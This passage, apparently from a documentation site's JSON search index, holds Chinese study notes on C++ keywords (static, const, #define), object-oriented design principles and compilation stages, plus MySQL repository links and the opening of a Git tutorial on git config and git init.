\u662f\u5c5e\u4e8e\u7c7b\uff0c\u800c\u4e0d\u5c5e\u4e8e\u67d0\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e5f\u53ea\u6709\u4e00\u4e2a\u5730\u5740\u4fdd\u5b58\u4e00\u4efd\u6570\u636e\u5b58\u653e\u4e8e\u6570\u636e\u533a\u3002\u5728\u7c7b\u4e2d\u53ea\u662f\u58f0\u660e\uff0c\u5e76\u4e0d\u662f\u5b9a\u4e49\uff0c\u56e0\u6b64\u4e0d\u5206\u914d\u5185\u5b58\uff0c\u5bf9\u7c7b\u7528sizeof\u6c42\u5927\u5c0f\u4e5f\u4e0d\u4f1a\u5c06static\u53d8\u91cf\u5f97\u5927\u5c0f\u52a0\u5165\u3002 \u5fc5\u987b\u5728\u7c7b\u58f0\u660e\u7684\u5916\u90e8\uff0c\u4ee5\u53camain()\u51fd\u6570\u7684\u5916\u90e8\uff0c\u4e5f\u5c31\u662f\u5168\u90e8\u53d8\u91cf\u533a\u57df\u5bf9\u7c7b\u7684static\u6210\u5458\u53d8\u91cf\u518d\u6b21\u5b9a\u4e49\uff08\u5b9a\u4ee5\u540e\u624d\u5206\u914d\u552f\u4e00\u5185\u5b58\uff0c\u6b64\u65f6\u8be5\u7c7b\u9759\u6001\u6210\u5458\u53d8\u91cf\u76f8\u5f53\u4e8e\u662f\u5168\u5c40\u7684\u9759\u6001\u53d8\u91cf\u4e86\uff0c\u53ea\u662f\u8c03\u7528\u7684\u65f6\u5019\u8981\u4f7f\u7528\u7c7b\u540d\u52a0::\uff09\u3002\u82e5\u53ea\u5b9a\u4e49\u4e0d\u8d4b\u503c\u521d\u59cb\u5316\uff0c\u5219\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\u3002 C++\u7c7b\u7684\u9759\u6001\u6210\u5458\u51fd\u6570 \u53ea\u80fd\u8c03\u7528\u672c\u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u6216\u51fd\u6570\uff0c\u4e0d\u80fd\u8c03\u7528\u672c\u7c7b\u7684\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u53d8\u91cf\u3002\u56e0\u4e3a\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u53d8\u91cf\u5728\u7c7b\u6210\u5458\u51fd\u6570\u4e2d\u8c03\u7528\u65f6\uff0c\u90fd\u662f\u7531\u5f62\u53c2\u4e2d\u9690\u542b\u4e00\u4e2a\u6307\u5411\u5f53\u524d\u5b9e\u4f8b\u5bf9\u8c61\u7684this\u6307\u9488\u6765\u8c03\u7528\u3002\u7136\u800c\u9759\u6001\u6210\u5458\u51fd\u6570\u6ca1\u6709\u8fd9\u4e2athis\u5f62\u53c2\u3002","title":"static \u5173\u952e\u5b57\u7684\u4f7f\u7528"},{"location":"cplusplus/questions/#const-keywords","text":"\u9632\u6b62\u88ab\u4fee\u9970\u7684\u6210\u5458\u7684\u5185\u5bb9\u88ab\u6539\u53d8\u3002 \u4fee\u9970\u7c7b\u7684\u6210\u5458\u51fd\u6570\u65f6\uff0c\u8868\u793a\u5176\u4e3a\u4e00\u4e2a\u5e38\u51fd\u6570\uff0c\u610f\u5473\u7740\u6210\u5458\u51fd\u6570\u5c06\u4e0d\u80fd\u4fee\u6539\u7c7b\u6210\u5458\u53d8\u91cf\u7684\u503c\u3002 \u5728\u51fd\u6570\u58f0\u660e\u65f6\u4fee\u9970\u53c2\u6570\uff0c\u8868\u793a\u5728\u51fd\u6570\u8bbf\u95ee\u65f6\u53c2\u6570\uff08\u5305\u62ec\u6307\u9488\u548c\u5b9e\u53c2\uff09\u7684\u503c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 \u5bf9\u4e8e\u6307\u9488\u800c\u8a00\uff0c\u53ef\u4ee5\u6307\u5b9a\u6307\u9488\u672c\u8eab\u4e3aconst\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u6307\u9488\u6240\u6307\u7684\u6570\u636e\u4e3aconst\uff0cconst int b = &a;\u6216\u8005int const b = &a;\u4fee\u9970\u7684\u90fd\u662f\u540e\u9762\u7684\u503c\uff0c\u5206\u522b\u4ee3\u8868*b\u548cb\u4e0d\u80fd\u6539\u53d8 \u3002 const \u53ef\u4ee5\u66ff\u4ee3c\u8bed\u8a00\u4e2d\u7684#define \u5b8f\u5b9a\u4e49\uff0c\u597d\u5904\u662f\u5728log\u4e2d\u53ef\u4ee5\u6253\u5370\u51faBUFFER_SIZE \u7684\u503c\uff0c\u800c\u5b8f\u5b9a\u4e49\u7684\u5219\u662f\u4e0d\u80fd #define BUFFER_SIZE 512 const int BUFFER_SIZE = 512; \u6ce8\u610f\uff1aconst\u6570\u636e\u6210\u5458\u5fc5\u987b\u4f7f\u7528\u6210\u5458\u521d\u59cb\u5316\u5217\u8868\u8fdb\u884c\u521d\u59cb\u5316\u3002","title":"const \u5173\u952e\u5b57\u7684\u4f7f\u7528"},{"location":"cplusplus/questions/#diffences-between-define-and-const","text":"\u5c31\u8d77\u4f5c\u7528\u7684\u9636\u6bb5\u800c\u8a00\uff1a #define\u662f\u5728\u7f16\u8bd1\u7684\u9884\u5904\u7406\u9636\u6bb5\u8d77\u4f5c\u7528\uff0c\u800cconst\u662f\u5728 \u7f16\u8bd1\u3001\u8fd0\u884c\u7684\u65f6\u5019\u8d77\u4f5c\u7528\u3002 \u5c31\u8d77\u4f5c\u7528\u7684\u65b9\u5f0f\u800c\u8a00\uff1a #define\u53ea\u662f\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u66ff\u6362\uff0c\u6ca1\u6709\u7c7b\u578b\u68c0\u67e5\u3002\u800cconst\u6709\u5bf9\u5e94\u7684\u6570\u636e\u7c7b\u578b\uff0c\u662f\u8981\u8fdb\u884c\u5224\u65ad\u7684\uff0c\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u4f4e\u7ea7\u7684\u9519\u8bef\u3002 \u5c31\u5b58\u50a8\u65b9\u5f0f\u800c\u8a00\uff1a#define\u53ea\u662f\u8fdb\u884c\u5c55\u5f00\uff0c\u6709\u591a\u5c11\u5730\u65b9\u4f7f\u7528\uff0c\u5c31\u66ff\u6362\u591a\u5c11\u6b21\uff0c\u5b83\u5b9a\u4e49\u7684\u5b8f\u5e38\u91cf\u5728\u5185\u5b58\u4e2d\u6709\u82e5\u5e72\u4e2a\u5907\u4efd\uff1bconst\u5b9a\u4e49\u7684\u53ea\u8bfb\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ea\u6709\u4e00\u4efd\u5907\u4efd\u3002 \u4ece\u4ee3\u7801\u8c03\u8bd5\u7684\u65b9\u4fbf\u7a0b\u5ea6\u800c\u8a00\uff1a const\u5e38\u91cf\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u7684\uff0cdefine\u662f\u4e0d\u80fd\u8fdb\u884c\u8c03\u8bd5\u7684\uff0c\u56e0\u4e3a\u5728\u9884\u7f16\u8bd1\u9636\u6bb5\u5c31\u5df2\u7ecf\u66ff\u6362\u6389\u4e86\u3002","title":"define \u548c const \u7684\u533a\u522b"},{"location":"cplusplus/questions/#object-oriented-design-principles","text":"\u5355\u4e00\u804c\u8d23\u539f\u5219,\u4e00\u4e2a\u5408\u7406\u7684\u7c7b\uff0c\u5e94\u8be5\u4ec5\u6709\u4e00\u4e2a\u5f15\u8d77\u5b83\u53d8\u5316\u7684\u539f\u56e0\uff0c\u5373\u5355\u4e00\u804c\u8d23,\u5c31\u662f\u8bbe\u8ba1\u7684\u8fd9\u4e2a\u7c7b\u529f\u80fd\u5e94\u8be5\u53ea\u6709\u4e00\u4e2a; \u4f18\u70b9\uff1a\u6d88\u9664\u8026\u5408\uff0c\u51cf\u5c0f\u56e0\u9700\u6c42\u53d8\u5316\u5f15\u8d77\u4ee3\u7801\u50f5\u5316\u3002 \u5f00-\u95ed\u539f\u5219\uff0c\u8bb2\u7684\u662f\u8bbe\u8ba1\u8981\u5bf9\u6269\u5c55\u6709\u597d\u7684\u652f\u6301\uff0c\u800c\u5bf9\u4fee\u6539\u8981\u4e25\u683c\u9650\u5236\u3002\u5373\u5bf9\u6269\u5c55\u5f00\u653e\uff0c\u5bf9\u4fee\u6539\u5c01\u95ed\u3002 \u4f18\u70b9\uff1a\u964d\u4f4e\u4e86\u7a0b\u5e8f\u5404\u90e8\u5206\u4e4b\u95f4\u7684\u8026\u5408\u6027\uff0c\u5176\u9002\u5e94\u6027\u3001\u7075\u6d3b\u6027\u3001\u7a33\u5b9a\u6027\u90fd\u6bd4\u8f83\u597d\u3002\u5f53\u5df2\u6709\u8f6f\u4ef6\u7cfb\u7edf\u9700\u8981\u589e\u52a0\u65b0\u7684\u529f\u80fd\u65f6\uff0c\u4e0d\u9700\u8981\u5bf9\u4f5c\u4e3a\u7cfb\u7edf\u57fa\u7840\u7684\u62bd\u8c61\u5c42\u8fdb\u884c\u4fee\u6539\uff0c\u53ea\u9700\u8981\u5728\u539f\u6709\u57fa\u7840\u4e0a\u9644\u52a0\u65b0\u7684\u6a21\u5757\u5c31\u80fd\u5b9e\u73b0\u6240\u9700\u8981\u6dfb\u52a0\u7684\u529f\u80fd\u3002\u589e\u52a0\u7684\u65b0\u6a21\u5757\u5bf9\u539f\u6709\u7684\u6a21\u5757\u5b8c\u5168\u6ca1\u6709\u5f71\u54cd\u6216\u5f71\u54cd\u5f88\u5c0f\uff0c\u8fd9\u6837\u5c31\u65e0\u987b\u4e3a\u539f\u6709\u6a21\u5757\u8fdb\u884c\u91cd\u65b0\u6d4b\u8bd5\u3002 \u91cc\u6c0f\u4ee3\u6362\u539f\u5219\uff0c\u5f88\u4e25\u683c\u7684\u539f\u5219\uff0c\u89c4\u5219\u662f\u201c\u5b50\u7c7b\u5fc5\u987b\u80fd\u591f\u66ff\u6362\u57fa\u7c7b\uff0c\u5426\u5219\u4e0d\u5e94\u5f53\u8bbe\u8ba1\u4e3a\u5176\u5b50\u7c7b\u3002\u201d\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a\u8f6f\u4ef6\u5b9e\u4f53\u5982\u679c\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u7236\u7c7b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e00\u5b9a\u9002\u7528\u4e8e\u5176\u5b50\u7c7b\uff0c\u800c\u4e14\u5b83\u5bdf\u89c9\u4e0d\u51fa\u7236\u7c7b\u5bf9\u8c61\u548c\u5b50\u7c7b\u5bf9\u8c61\u7684\u533a\u522b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8f6f\u4ef6\u91cc\u9762\uff0c\u628a\u7236\u7c7b\u90fd\u66ff\u6362\u6210\u5b83\u7684\u5b50\u7c7b\uff0c\u7a0b\u5e8f\u7684\u884c\u4e3a\u6ca1\u6709\u53d8\u5316\u3002 \u4f18\u70b9\uff1a\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5b9e\u73b0\u540c\u4e00\u7236\u7c7b\u4e0b\u5404\u4e2a\u5b50\u7c7b\u7684\u4e92\u6362\uff0c\u800c\u5ba2\u6237\u7aef\u53ef\u4ee5\u6beb\u4e0d\u5bdf\u89c9\u3002 \u4f9d\u8d56\u5012\u6362\u539f\u5219\uff0c\u201c\u8bbe\u8ba1\u8981\u4f9d\u8d56\u4e8e\u62bd\u8c61\u800c\u4e0d\u662f\u5177\u4f53\u5316\u201d\u3002\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u8bbe\u8ba1\u7684\u65f6\u5019\u6211\u4eec\u8981\u7528\u62bd\u8c61\u6765\u601d\u8003\uff0c\u800c\u4e0d\u662f\u4e00\u4e0a\u6765\u5c31\u5f00\u59cb\u5212\u5206\u6211\u9700\u8981\u54ea\u4e9b\u54ea\u4e9b\u7c7b\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u662f\u5177\u4f53\u3002 \u201cHigh level modules should not depend upon low level modules, both should depend upon abstractions. Abstractions should not depend upon details, details should depend upon abstractions.\u201d \u9ad8\u5c42\u6a21\u5757\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4f4e\u5c42\u6a21\u5757\uff0c\u5b83\u4eec\u90fd\u5e94\u8be5\u4f9d\u8d56\u62bd\u8c61\u3002\u62bd\u8c61\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u7ec6\u8282\uff0c\u7ec6\u8282\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61\u3002 \u53e6\u4e00\u79cd\u8868\u8ff0\u4e3a\uff1a \u8981\u9488\u5bf9\u63a5\u53e3\u7f16\u7a0b\uff0c\u4e0d\u8981\u9488\u5bf9\u5b9e\u73b0\u7f16\u7a0b\u3002\u5373\u201cProgram to an interface, not an implementation.\u201d \u4f18\u70b9\uff1a\u4eba\u7684\u601d\u7ef4\u672c\u8eab\u5b9e\u9645\u4e0a\u5c31\u662f\u5f88\u62bd\u8c61\u7684\uff0c\u6211\u4eec\u5206\u6790\u95ee\u9898\u7684\u65f6\u5019\u4e0d\u662f\u4e00\u4e0b\u5b50\u5c31\u8003\u8651\u5230\u7ec6\u8282\uff0c\u800c\u662f\u5f88\u62bd\u8c61\u7684\u5c06\u6574\u4e2a\u95ee\u9898\u90fd\u6784\u601d\u51fa\u6765\uff0c\u6240\u4ee5\u9762\u5411\u62bd\u8c61\u8bbe\u8ba1\u662f\u7b26\u5408\u4eba\u7684\u601d\u7ef4\u7684\u3002\u53e6\u5916\u8fd9\u4e2a\u539f\u5219\u4f1a\u5f88\u597d\u7684\u652f\u6301\uff08\u5f00\u95ed\u539f\u5219\uff09OCP\uff0c\u9762\u5411\u62bd\u8c61\u7684\u8bbe\u8ba1\u4f7f\u6211\u4eec\u80fd\u591f\u4e0d\u5fc5\u592a\u591a\u4f9d\u8d56\u4e8e\u5b9e\u73b0\uff0c\u8fd9\u6837\u6269\u5c55\u5c31\u6210\u4e3a\u4e86\u53ef\u80fd\uff0c\u8fd9\u4e2a\u539f\u5219\u4e5f\u662f\u53e6\u4e00\u7bc7\u6587\u7ae0\u300aDesign by Contract\u300b\u7684\u57fa\u77f3\u3002 \u63a5\u53e3\u9694\u79bb\u539f\u5219\uff0c\u201c\u5c06\u5927\u7684\u63a5\u53e3\u6253\u6563\u6210\u591a\u4e2a\u5c0f\u63a5\u53e3\u201d\uff0c\u8ba9\u7cfb\u7edf\u89e3\u8026\uff0c\u4ece\u800c\u5bb9\u6613\u91cd\u6784\uff0c\u66f4\u6539\u548c\u91cd\u65b0\u90e8\u7f72\u3002 \u4f18\u70b9\uff1a\u4f1a\u4f7f\u4e00\u4e2a\u8f6f\u4ef6\u7cfb\u7edf\u529f\u80fd\u6269\u5c55\u65f6\uff0c\u4fee\u6539\u7684\u538b\u529b\u4e0d\u4f1a\u4f20\u5230\u522b\u7684\u5bf9\u8c61\u90a3\u91cc\u3002 \u8fea\u7c73\u7279\u6cd5\u5219\u6216\u6700\u5c11\u77e5\u8bc6\u539f\u5219\uff0c\u8fd9\u4e2a\u539f\u5219\u9996\u6b21\u5728Demeter\u7cfb\u7edf\u4e2d\u5f97\u5230\u6b63\u5f0f\u8fd0\u7528\uff0c\u6240\u4ee5\u5b9a\u4e49\u4e3a\u8fea\u7c73\u7279\u6cd5\u5219\u3002\u5b83\u8bb2\u7684\u662f\u201c\u4e00\u4e2a\u5bf9\u8c61\u5e94\u5f53\u5c3d\u53ef\u80fd\u5c11\u7684\u53bb\u4e86\u89e3\u5176\u4ed6\u5bf9\u8c61\u201d\u3002 \u4f18\u70b9\uff1a\u6d88\u9664\u8026\u5408\u3002 \u597d\u4e86\uff0c\u9762\u5411\u5bf9\u8c61\u7684\u516d\u5927\u539f\u5219\u5c31\u4ecb\u7ecd\u5230\u8fd9\u91cc\u4e86\u3002\u5176\u5b9e\uff0c\u6211\u4eec\u4e0d\u96be\u53d1\u73b0\uff0c\u516d\u5927\u539f\u5219\u867d\u8bf4\u662f\u539f\u5219\uff0c\u4f46\u5b83\u4eec\u5e76\u4e0d\u662f\u5f3a\u5236\u6027\u7684\uff0c\u66f4\u591a\u7684\u662f\u5efa\u8bae\u3002\u9075\u7167\u8fd9\u4e9b\u539f\u5219\u56fa\u7136\u80fd\u5e2e\u52a9\u6211\u4eec\u66f4\u597d\u7684\u89c4\u8303\u6211\u4eec\u7684\u7cfb\u7edf\u8bbe\u8ba1\u548c\u4ee3\u7801\u4e60\u60ef\uff0c\u4f46\u5e76\u4e0d\u662f\u6240\u6709\u7684\u573a\u666f\u90fd\u9002\u7528\uff0c\u5c31\u4f8b\u5982\u63a5\u53e3\u9694\u79bb\u539f\u5219\uff0c\u5728\u73b0\u5b9e\u7cfb\u7edf\u5f00\u53d1\u4e2d\uff0c\u6211\u4eec\u5f88\u96be\u5b8c\u5168\u9075\u5b88\u4e00\u4e2a\u6a21\u5757\u4e00\u4e2a\u63a5\u53e3\u7684\u8bbe\u8ba1\uff0c\u5426\u5219\u4e1a\u52a1\u591a\u4e86\u5c31\u4f1a\u51fa\u73b0\u4ee3\u7801\u8bbe\u8ba1\u8fc7\u5ea6\u7684\u60c5\u51b5\uff0c\u8ba9\u6574\u4e2a\u7cfb\u7edf\u53d8\u5f97\u8fc7\u4e8e\u5e9e\u5927\uff0c\u589e\u52a0\u4e86\u7cfb\u7edf\u7684\u590d\u6742\u5ea6\uff0c\u751a\u81f3\u5f71\u54cd\u81ea\u5df1\u7684\u9879\u76ee\u8fdb\u5ea6\uff0c\u5f97\u4e0d\u507f\u5931\u554a\u3002 \u6240\u4ee5\uff0c\u8fd8\u662f\u90a3\u53e5\u8bdd\uff0c\u5728\u5408\u9002\u7684\u573a\u666f\u9009\u62e9\u5408\u9002\u7684\u6280\u672f\uff01","title":"\u9762\u5411\u5bf9\u8c61\u7684\u8bbe\u8ba1\u539f\u5219"},{"location":"cplusplus/questions/#compilation-process","text":"\u9884\u7f16\u8bd1\u5904\u7406(.c) \uff0d> \u7f16\u8bd1\u3001\u4f18\u5316\u7a0b\u5e8f\uff08.s\uff09\uff0d>\u6c47\u7f16\u7a0b\u5e8f(.obj\u3001.o\u3001.a\u3001.ko) \uff0d> \u94fe\u63a5\u7a0b\u5e8f\uff08.exe\u3001.elf\u3001.axf\u7b49\uff09","title":"C++ \u7f16\u8bd1\u8fc7\u7a0b"},{"location":"database/mysql/","text":"MySql \uf0c1 apt repo \uf0c1 https://blog.csdn.net/weixin_44129085/article/details/104481986 https://dev.mysql.com/downloads/repo/apt/","title":"MySql"},{"location":"database/mysql/#mysql","text":"","title":"MySql"},{"location":"database/mysql/#apt-repo","text":"https://blog.csdn.net/weixin_44129085/article/details/104481986 https://dev.mysql.com/downloads/repo/apt/","title":"apt repo"},{"location":"git/git/","text":"Git \uf0c1 \u672c\u4eba\u603b\u7ed3\u7684 Git \u6559\u7a0b \u7b80\u4ecb \uf0c1 Git \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u7528\u4e8e\u654f\u6377\u9ad8\u6548\u5730\u5904\u7406\u4efb\u4f55\u6216\u5c0f\u6216\u5927\u7684\u9879\u76ee\u3002 Git \u662f Linus Torvalds \u4e3a\u4e86\u5e2e\u52a9\u7ba1\u7406 Linux \u5185\u6838\u5f00\u53d1\u800c\u5f00\u53d1\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7248\u672c\u63a7\u5236\u8f6f\u4ef6\u3002 Git \u4e0e\u5e38\u7528\u7684\u7248\u672c\u63a7\u5236\u5de5\u5177 CVS, Subversion \u7b49\u4e0d\u540c\uff0c\u5b83\u91c7\u7528\u4e86\u5206\u5e03\u5f0f\u7248\u672c\u5e93\u7684\u65b9\u5f0f\uff0c\u4e0d\u5fc5\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u652f\u6301\u3002 Git Official: https://git-scm.com/ Git Documentation: https://git-scm.com/doc Git Reference Guide: https://git-scm.com/docs Git Book: https://git-scm.com/book/en/v2 \u5b89\u88c5 \uf0c1 \u5404\u7cfb\u7edf\u5b89\u88c5\u5b98\u65b9\u8bf4\u660e: https://git-scm.com/downloads Older releases are available and the Git source repository is on GitHub. git [--version] [--help] [-C <path>] [-c <name>=<value>] [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path] [-p|--paginate|-P|--no-pager] [--no-replace-objects] [--bare] [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>] [--super-prefix=<path>] [--config-env=<name>=<envvar>] <command> [<args>] Git \u5177\u6709\u5f02\u5e38\u4e30\u5bcc\u7684\u547d\u4ee4\u96c6\uff0c\u53ef\u63d0\u4f9b\u9ad8\u7ea7\u64cd\u4f5c\u548c\u5bf9\u5185\u90e8\u7684\u5b8c\u5168\u8bbf\u95ee\u3002 \u638c\u63e1\u57fa\u672c\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u201cgit help command\u201d\u4e86\u89e3\u66f4\u591a\u5173\u4e8e\u5355\u4e2a Git \u547d\u4ee4\u7684\u4fe1\u606f\u3002 \u914d\u7f6e \uf0c1 Git \u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb\u505a git config \u7684\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u6765\u914d\u7f6e\u6216\u8bfb\u53d6\u76f8\u5e94\u7684\u5de5\u4f5c\u73af\u5883\u53d8\u91cf\u3002 \u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\uff0c\u51b3\u5b9a\u4e86 Git \u5728\u5404\u4e2a\u73af\u8282\u7684\u5177\u4f53\u5de5\u4f5c\u65b9\u5f0f\u548c\u884c\u4e3a\u3002\u8fd9\u4e9b\u53d8\u91cf\u53ef\u4ee5\u5b58\u653e\u5728\u4ee5\u4e0b\u4e09\u4e2a\u4e0d\u540c\u7684\u5730\u65b9\uff1a /etc/gitconfig \u6587\u4ef6\uff1a\u7cfb\u7edf\u4e2d\u5bf9\u6240\u6709\u7528\u6237\u90fd\u666e\u904d\u9002\u7528\u7684\u914d\u7f6e\u3002\u82e5\u4f7f\u7528 git config \u65f6\u7528 --system \u9009\u9879\uff0c\u8bfb\u5199\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6\u3002 ~/.gitconfig \u6587\u4ef6\uff1a\u7528\u6237\u76ee\u5f55\u4e0b\u7684\u914d\u7f6e\u6587\u4ef6\u53ea\u9002\u7528\u4e8e\u8be5\u7528\u6237\u3002\u82e5\u4f7f\u7528 git config \u65f6\u7528 --global \u9009\u9879\uff0c\u8bfb\u5199\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6\u3002 \u5f53\u524d\u9879\u76ee\u7684 Git \u76ee\u5f55\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u4e5f\u5c31\u662f\u5de5\u4f5c\u76ee\u5f55\u4e2d\u7684 .git/config \u6587\u4ef6\uff09\uff1a\u8fd9\u91cc\u7684\u914d\u7f6e\u4ec5\u4ec5\u9488\u5bf9\u5f53\u524d\u9879\u76ee\u6709\u6548\u3002\u6bcf\u4e00\u4e2a\u7ea7\u522b\u7684\u914d\u7f6e\u90fd\u4f1a\u8986\u76d6\u4e0a\u5c42\u7684\u76f8\u540c\u914d\u7f6e\uff0c\u6240\u4ee5 .git/config \u91cc\u7684\u914d\u7f6e\u4f1a\u8986\u76d6 /etc/gitconfig \u4e2d\u7684\u540c\u540d\u53d8\u91cf\u3002 \u5728 Windows \u7cfb\u7edf\u4e0a\uff0cGit \u4f1a\u627e\u5bfb\u7528\u6237\u4e3b\u76ee\u5f55\u4e0b\u7684 .gitconfig \u6587\u4ef6\u3002\u4e3b\u76ee\u5f55\u5373 $HOME \u53d8\u91cf\u6307\u5b9a\u7684\u76ee\u5f55\uff0c\u4e00\u822c\u90fd\u662f C:\\Documents and Settings\\$USER \u3002 \u5e38\u7528\u7684\u914d\u7f6e\u547d\u4ee4\u5982\u4e0b: # \u914d\u7f6e\u4e2a\u4eba\u7684\u7528\u6237\u540d\u79f0\u548c\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff1a $ git config --global user.name \"runoob\" $ git config --global user.email test@runoob.com # \u8bbe\u7f6eGit\u9ed8\u8ba4\u4f7f\u7528\u7684\u6587\u672c\u7f16\u8f91\u5668, \u4e00\u822c\u53ef\u80fd\u4f1a\u662f `Vi` \u6216\u8005 `Vim`\u3002\u5982\u679c\u4f60\u6709\u5176\u4ed6\u504f\u597d\uff0c\u6bd4\u5982 `Emacs` \u7684\u8bdd\uff0c\u53ef\u4ee5\u91cd\u65b0\u8bbe\u7f6e: $ git config --global core.editor emacs # \u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u5e38\u7528\u7684\u662f\uff0c\u5728\u89e3\u51b3\u5408\u5e76\u51b2\u7a81\u65f6\u4f7f\u7528\u54ea\u79cd\u5dee\u5f02\u5206\u6790\u5de5\u5177\u3002\u6bd4\u5982\u8981\u6539\u7528 `vimdiff` \u7684\u8bdd\uff1a # Git \u53ef\u4ee5\u7406\u89e3 kdiff3\uff0ctkdiff\uff0cmeld\uff0cxxdiff\uff0cemerge\uff0cvimdiff\uff0cgvimdiff\uff0cecmerge\uff0c\u548c opendiff \u7b49\u5408\u5e76\u5de5\u5177\u7684\u8f93\u51fa\u4fe1\u606f\u3002 $ git config --global merge.tool vimdiff # \u8981\u68c0\u67e5\u5df2\u6709\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\uff1a $ git config --list http.postbuffer=2M user.name=runoob user.email=test@runoob.com # \u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u67d0\u4e2a\u53d8\u91cf\u7684\u8bbe\u5b9a\uff0c\u50cf\u8fd9\u6837: $ git config user.name runoob \u5982\u679c\u8981\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u9879\u76ee\u4e2d\u4f7f\u7528\u5176\u4ed6\u540d\u5b57\u6216\u8005\u7535\u90ae\uff0c\u53ea\u8981\u53bb\u6389 --global \u9009\u9879\u91cd\u65b0\u914d\u7f6e\u5373\u53ef\uff0c\u65b0\u7684\u8bbe\u5b9a\u4fdd\u5b58\u5728\u5f53\u524d\u9879\u76ee\u7684 .git/config \u6587\u4ef6\u91cc\u3002 \u6709\u65f6\u5019\u4f1a\u770b\u5230\u91cd\u590d\u7684\u53d8\u91cf\u540d\uff0c\u90a3\u5c31\u8bf4\u660e\u5b83\u4eec\u6765\u81ea\u4e0d\u540c\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u6bd4\u5982 /etc/gitconfig \u548c ~/.gitconfig \uff09\uff0c\u4e0d\u8fc7\u6700\u7ec8 Git \u5b9e\u9645\u91c7\u7528\u7684\u662f\u6700\u540e\u4e00\u4e2a\u3002 \u8fd9\u4e9b\u914d\u7f6e\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 ~/.gitconfig \u6216 /etc/gitconfig \u4e5f\u80fd\u770b\u5230\u3002 \u6d41\u7a0b \uf0c1 \u521d\u59cb\u5316 \uf0c1 git-init - \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684 Git \u5b58\u50a8\u5e93\u6216\u91cd\u65b0\u521d\u59cb\u5316\u73b0\u6709\u7684 git init [-q | --quiet] [--bare] [--template=<template_directory>] [--separate-git-dir <git dir>] [--object-format=<format>] [-b <branch-name> | --initial-branch=<branch-name>] [--shared[=<permissions>]] [directory] \u8be5\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684Git\u5b58\u50a8\u5e93 - \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a .git \u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542b objects \u3001 refs/heads \u3001 refs/tags \u548c\u6a21\u677f\u6587\u4ef6\u7684\u5b50\u76ee\u5f55\u3002\u8fd8\u5c06\u521b\u5efa\u4e00\u4e2a\u5f15\u7528master\u5206\u652f HEAD \u7684\u521d\u59cb HEAD \u6587\u4ef6\u3002 --bare : \u521b\u5efa\u4e00\u4e2a\u7eaf\u4ed3\u5e93\u3002\u5982\u679c\u672a\u8bbe\u7f6e GIT_DIR \u73af\u5883\u53d8\u91cf\uff0c\u5219\u5c06\u5176\u8bbe\u7f6e\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002 --object-format=<format> : \u6307\u5b9a\u5b58\u50a8\u5e93\u7684\u5bf9\u8c61\u683c\u5f0f\uff08\u54c8\u5e0c\u7b97\u6cd5\uff09\u3002\u6709\u6548\u503c\u4e3a sha1 \u548c\uff08\u5982\u679c\u542f\u7528\uff09 sha256 \u3002 sha1 \u662f\u9ed8\u8ba4\u503c\u3002 --template=<template_directory> : \u6307\u5b9a\u8981\u4f7f\u7528\u6a21\u677f\u7684\u76ee\u5f55\u3002 -b <branch-name> | --initial-branch=<branch-name> : \u5728\u65b0\u521b\u5efa\u7684\u4ed3\u5e93\u4e2d\u4e3a\u521d\u59cb\u5206\u652f\u6307\u5b9a\u540d\u79f0\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u540d\u79f0\uff1a master \u3002 --shared : \u6307\u5b9a Git \u5b58\u50a8\u5e93\u5728\u591a\u4e2a\u7528\u6237\u4e4b\u95f4\u5171\u4eab\u3002 \u53c2\u8003: https://git-scm.com/docs/git-init \u514b\u9686 \uf0c1 